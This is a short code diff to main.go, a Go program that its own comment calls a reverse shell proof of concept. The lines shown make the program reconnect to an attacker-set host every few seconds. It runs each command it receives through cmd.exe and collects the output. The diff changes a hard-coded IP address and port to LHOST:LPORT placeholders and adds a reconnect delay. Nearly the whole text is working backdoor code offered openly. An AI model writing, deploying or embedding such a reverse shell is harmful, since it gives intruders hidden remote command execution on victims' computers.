@@ -1,5 +1,4 @@
 // main.go
-// + linux,windows
 package main
 
 // Simmple basic universal reverse shell POC
@@ -17,7 +16,7 @@ import (
 func main() {
 	for {
 		time.Sleep(3 * time.Second)
-		sendRev("10.13.0.48:6969")
+		sendRev("LHOST:LPORT")
 	}
 }
 
@@ -38,10 +37,11 @@ func sendRev(host string) {
 			order, err := r.ReadString('\n')
 			if nil != err {
 				conn.Close()
+				time.Sleep(time.Minute)
 				sendRev(host)
 				return
 			}
-			//cmd = exec.Command("powershell.exe", order)
+			//cmd = exec.Command("powershell.exe", "-c", order)
 			cmd = exec.Command("cmd.exe", "/C", order)
 			//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 			out, _ := cmd.CombinedOutput()
